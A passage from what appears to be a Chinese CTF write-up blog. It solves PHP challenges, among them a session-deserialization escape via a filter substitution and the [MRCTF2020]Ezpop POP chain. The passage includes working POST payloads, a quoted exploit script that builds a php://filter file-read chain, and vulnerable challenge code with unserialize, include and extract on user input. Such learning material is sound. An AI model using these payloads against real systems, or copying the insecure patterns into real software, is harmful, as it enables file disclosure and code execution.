class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="解题-13"><a href="#解题-13" class="headerlink" title="解题"></a>解题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取函数名</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 正则表达式黑名单过滤，没有过滤phtml</span></span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 销毁数组session</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置session值</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把数组中的变量解压为独立变量</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 函数不存在则返回链接</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line"><span class="comment">// 获取路径，设置session值</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="comment">// base64编码图像信息</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// base64编码图像信息并且获取其哈希加密</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 序列化SESSION，并且调用函数进行过滤</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 高亮显示源代码</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 显示php信息</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 显示show_image</span></span><br><span class="line">    <span class="comment">// 反序列化serialize_info</span></span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="comment">// 回显userinfo的base64解码内容</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>整体看着太杂了，揪出关键源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 高亮显示源代码</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 显示php信息</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 显示show_image</span></span><br><span class="line">    <span class="comment">// 反序列化serialize_info</span></span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="comment">// 回显userinfo的base64解码内容</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 前两项属于锁死的类型</span></span><br><span class="line"><span class="comment">// 重点看第三项</span></span><br></pre></td></tr></table></figure>

<p>phpinfo唯一能给出的有用信息，就是：d0g3_f1ag.php</p>
<p>我们需要的是从这个文件当中读取信息。</p>
<p>说实在，这里我看懵圈了。</p>
<p>现在的问题是，如何读取文件内容？</p>
<h3 id="按照大佬的思路反序列化"><a href="#按照大佬的思路反序列化" class="headerlink" title="按照大佬的思路反序列化"></a>按照大佬的思路反序列化</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取的核心是利用这个去读取</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line"><span class="comment">// 利用的核心是反序列化的垃圾回收机制</span></span><br><span class="line"><span class="comment"># 垃圾回收机制如下：</span></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;red&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;33123&quot;</span>;&#125;</span><br><span class="line"><span class="comment"># 1.假设flag前面就限定为数字4，一旦flag超出4位，那么后面多余的字符串将被抛弃。</span></span><br><span class="line"><span class="comment"># 2.假设 `s:5:&quot;33123&quot;;&#125;;` 后面还有东西，但是 `a:2&#123;` 的数字2恒不变，那么这个a所包裹的大括号后面的东西将被舍弃</span></span><br><span class="line">    <span class="comment"># a:2:&#123;s:4:&quot;flag&quot;;s:1:&quot;1&quot;;s:3:&quot;red&quot;;s:5:&quot;33123&quot;;&#125;   =运行读取=&gt;  a:2:&#123;s:4:&quot;flag&quot;;s:1:&quot;1&quot;;s:3:&quot;red&quot;;s:5:&quot;33123&quot;;&#125;</span></span><br><span class="line">    <span class="comment"># a:2:&#123;s:4:&quot;flag&quot;;s:1:&quot;1&quot;;s:3:&quot;red&quot;;s:5:&quot;33123&quot;;&#125;;s:3:&#x27;read&#x27;;s:6:&#x27;reading&#x27;&#125;;   =运行读取=&gt;  a:2:&#123;s:4:&quot;flag&quot;;s:1:&quot;1&quot;;s:3:&quot;red&quot;;s:5:&quot;33123&quot;;&#125;</span></span><br><span class="line"><span class="comment"># 反序列化的原因是要将后面出现的img变量序列化给删除了</span></span><br><span class="line"><span class="comment">// 序列化后的文本会直接跳过序列化的这个过程（目前观察确实是这样子，并且是同一变量session的情况下。）</span></span><br><span class="line">这次还给了我们另外一个知识，就是：</span><br><span class="line">    <span class="number">1</span>.反序列化的值是以   `;`  为分割的</span><br><span class="line">    <span class="number">2</span>.反序列化没有类似于 `=`  的绝对键值对</span><br></pre></td></tr></table></figure>

<p>简化：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// post传入session参数</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);    =&gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;d0g3_f1ag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 符合条件时，反序列化</span></span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="comment">// base64解码文件名，并且获得文件内容</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>尝试传参：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">    <span class="comment">// 这里说一下，post传入的序列化参数绕过了序列化的过程</span></span><br><span class="line">    <span class="comment">// 相当于提前序列化</span></span><br><span class="line">    _SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">    _SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">    flag&#123;<span class="number">415493</span>bd-<span class="number">0</span>bb6-<span class="number">4603</span>-<span class="number">8e9</span>e-<span class="number">62</span>b092d00c28&#125; </span><br></pre></td></tr></table></figure>

<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>结合之前的SQL注入来看，这里透露了注入的核心思想：</p>
<p>1.千方百计插入数据或者查询<br>2.千方百计替换掉数据或者查询<br>3.千方百计挤掉正常数据，插入异常数据或者查询</p>
<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>没见过的新题目，pop反序列化。</p>
<h2 id="原始信息-14"><a href="#原始信息-14" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="解题-14"><a href="#解题-14" class="headerlink" title="解题"></a>解题</h2><p>源码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag的位置</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment"># 拆解#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment"># 得到：反序列化魔术方法  </span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br></pre></td></tr></table></figure>

<p>本题方向：反序列化魔术方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 调用类，就能导入对应的文件内容</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="comment">// 导入文件的操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当尝试以调用函数的方法调用一个对象时，会被自动调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建即触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="comment">// 类似于hello world</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出即调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 返回变量值</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化时调用此方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 正则表达式筛选，验证</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="comment">// 创建即设置为空数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 私有类</span></span><br><span class="line">    <span class="comment">// 返回p变量值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 反序列化传入的参数</span></span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 创建新类并且回显</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>第一感觉：找出能用的类反序列化得到flag。但是仔细看下来，这是需要类和类之间反复调用的哇。<br>从基本的魔术方法反序列化调用，直接变成了反序列化调用多个类。<br>下面是某个大佬的wp，<a target="_blank" rel="noopener" href="https://blog.csdn.net/gd_9988/article/details/106111896">点击我跳转</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;memory_limit&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>这个wp利用了魔术方法创建即调用的特性不断的调用新类，最后利用输出函数输出了wp</p>
<p>还是有些晦涩，后面需要几次复盘。</p>
<h1 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h1><h2 id="原始信息-15"><a href="#原始信息-15" class="headerlink" title="原始信息"></a>原始信息</h2><p>网页发现一个js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">    hash = <span class="title function_">hex_md5</span>(code);</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;vcode&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (code != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">hex_md5</span>(code) == <span class="string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;您通过了验证！&quot;</span>);</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;./flag.php&quot;</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;你的授权码不正确！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;请输入授权码&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>里面有一个flag，尝试访问</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;./img/2.jpg&quot;</span> width=<span class="string">&quot;300&quot;</span> height=<span class="string">&quot;300&quot;</span> /&gt;</span><br><span class="line">&lt;h1&gt;拜托，我也是学过半小时网络安全的，你骗不了我！&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;我已经把购买者的IP保存了，显然你没有购买&lt;/p&gt;</span><br><span class="line">&lt;p&gt;验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag&lt;/p&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;index.html&quot;</span> &gt;还不快去买&lt;/p&gt;</span><br><span class="line">&lt;img src = <span class="string">&quot;./img/vx.jpg&quot;</span> &gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="解题-15"><a href="#解题-15" class="headerlink" title="解题"></a>解题</h2><p>访问flag.php,发现图片扫不出什么，以及放到linux上没什么反应，暂时放弃。</p>
